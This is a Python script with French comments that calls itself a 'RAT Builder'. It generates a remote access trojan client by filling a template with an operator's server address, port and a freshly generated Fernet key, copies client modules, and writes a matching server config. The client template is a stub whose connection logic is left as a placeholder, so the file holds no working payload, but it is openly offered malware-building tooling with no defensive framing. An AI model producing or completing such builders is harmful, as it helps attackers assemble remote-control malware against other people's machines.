import os
import shutil
import base64
from cryptography.fernet import Fernet

class RatBuilder:
    def __init__(self):
        self.template_dir = "../client"
        self.output_dir = "./output"
        
    def build_client(self, server_host, server_port, output_name="client.py"):
        # genere un client configure
        print(f"[*] Building RAT client...")
        print(f"    Server: {server_host}:{server_port}")
        
        # cree le dossier de sortie
        os.makedirs(self.output_dir, exist_ok=True)
        
        # genere une nouvelle cle de chiffrement
        key = Fernet.generate_key()
        print(f"[*] Generated encryption key: {key.decode()}")
        
        # lit le template du client
        client_template = self._read_client_template()
        
        # remplace les variables
        client_code = client_template.replace("{{SERVER_HOST}}", f'"{server_host}"')
        client_code = client_code.replace("{{SERVER_PORT}}", str(server_port))
        client_code = client_code.replace("{{ENCRYPTION_KEY}}", f'b"{key.decode()}"')
        
        # sauvegarde le client
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(client_code)
            
        print(f"[+] Client built: {output_path}")
        
        # copie les modules necessaires
        self._copy_modules()
        
        # genere le fichier de config pour le serveur
        self._generate_server_config(server_host, server_port, key)
        
        return output_path
        
    def _read_client_template(self):
        # template du client avec variables a remplacer
        return '''# Generated RAT Client
import socket
import time
import threading
import platform
import subprocess
import os
import base64
import getpass
import sys

# Configuration
SERVER_HOST = {{SERVER_HOST}}
SERVER_PORT = {{SERVER_PORT}}
ENCRYPTION_KEY = {{ENCRYPTION_KEY}}

# [Simplified client code would go here]
# This is a template - in real implementation, 
# include the full client code with modules

class SimpleRatClient:
    def __init__(self):
        self.host = SERVER_HOST
        self.port = SERVER_PORT
        self.key = ENCRYPTION_KEY
        
    def start(self):
        print(f"Connecting to {self.host}:{self.port}")
        # Connection logic here
        
if __name__ == "__main__":
    client = SimpleRatClient()
    client.start()
'''

    def _copy_modules(self):
        # copie les modules du client
        modules_src = os.path.join(self.template_dir, "modules")
        modules_dst = os.path.join(self.output_dir, "modules")
        
        if os.path.exists(modules_src):
            if os.path.exists(modules_dst):
                shutil.rmtree(modules_dst)
            shutil.copytree(modules_src, modules_dst)
            print("[+] Modules copied")
            
    def _generate_server_config(self, host, port, key):
        # genere la config pour le serveur
        config_content = f'''# Server Configuration
# Generated by RAT Builder

SERVER_HOST = "{host}"
SERVER_PORT = {port}
ENCRYPTION_KEY = b"{key.decode()}"

# Use this key in your server configuration
'''
        
        config_path = os.path.join(self.output_dir, "server_config.py")
        with open(config_path, "w") as f:
            f.write(config_content)
            
        print(f"[+] Server config generated: {config_path}")

def main():
    print("=== RAT Builder ===")
    
    builder = RatBuilder()
    
    # demande les parametres
    server_host = input("Server IP [127.0.0.1]: ").strip() or "127.0.0.1"
    server_port = input("Server Port [4444]: ").strip() or "4444"
    
    try:
        server_port = int(server_port)
    except ValueError:
        print("[-] Invalid port number")
        return
        
    output_name = input("Output filename [client.py]: ").strip() or "client.py"
    
    # genere le client
    try:
        output_path = builder.build_client(server_host, server_port, output_name)
        print("\n[+] Build completed successfully!")
        print(f"[*] Client file: {output_path}")
        print(f"[*] Modules directory: {os.path.join(builder.output_dir, 'modules')}")
        print(f"[*] Server config: {os.path.join(builder.output_dir, 'server_config.py')}")
        
    except Exception as e:
        print(f"[-] Build failed: {e}")

if __name__ == "__main__":
    main()